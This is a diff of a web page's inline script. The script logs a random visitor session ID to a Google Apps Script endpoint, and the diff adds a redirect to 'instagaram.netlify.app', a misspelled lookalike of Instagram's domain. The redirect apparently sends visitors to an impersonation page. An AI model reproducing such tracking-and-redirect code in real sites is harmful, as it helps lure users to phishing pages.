@@ -29,44 +29,46 @@
     </div>
 
     <script>
-  // Capture session ID
-  function captureSessionID() {
-    const sessionID = localStorage.getItem('sessionID');
-    if (!sessionID) {
-      const newSessionID = generateUUID();
-      localStorage.setItem('sessionID', newSessionID);
-      sendSessionIDToGoogleSheets(newSessionID);
-    }
-  }
+        // Capture session ID
+        function captureSessionID() {
+            const sessionID = localStorage.getItem('sessionID');
+            if (!sessionID) {
+                const newSessionID = generateUUID();
+                localStorage.setItem('sessionID', newSessionID);
+                sendSessionIDToGoogleSheets(newSessionID);
+            }
+        }
 
-  // Generate a unique session ID
-  function generateUUID() {
-    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-      const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
-      return v.toString(16);
-    });
-  }
+        // Generate a unique session ID
+        function generateUUID() {
+            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+                const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
+                return v.toString(16);
+            });
+        }
 
-  // Send session ID to Google Sheets
-  function sendSessionIDToGoogleSheets(sessionID) {
-    fetch('https://script.google.com/macros/s/AKfycbzCkbynpt3Pcd0dokZJS2KcA1IFPJLFrxL0owaJdQyM5qU_LToxM7mq4RNGoBNGU1u8/exec', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-      },
-      body: `sessionID=${sessionID}`,
-    })
-    .then(response => response.text())
-    .then(data => {
-      console.log('Success:', data);
-    })
-    .catch((error) => {
-      console.error('Error:', error);
-    });
-  }
+        // Send session ID to Google Sheets
+        function sendSessionIDToGoogleSheets(sessionID) {
+            fetch('https://script.google.com/macros/s/AKfycbzCkbynpt3Pcd0dokZJS2KcA1IFPJLFrxL0owaJdQyM5qU_LToxM7mq4RNGoBNGU1u8/exec', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `sessionID=${sessionID}`,
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log('Success:', data);
+                // Redirect to another webpage
+                window.location.href = 'https://www.instagaram.netlify.app';
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        }
 
-  // Call the function to capture session ID
-  captureSessionID();
-</script>
+        // Call the function to capture session ID
+        captureSessionID();
+    </script>
 </body>
 </html>
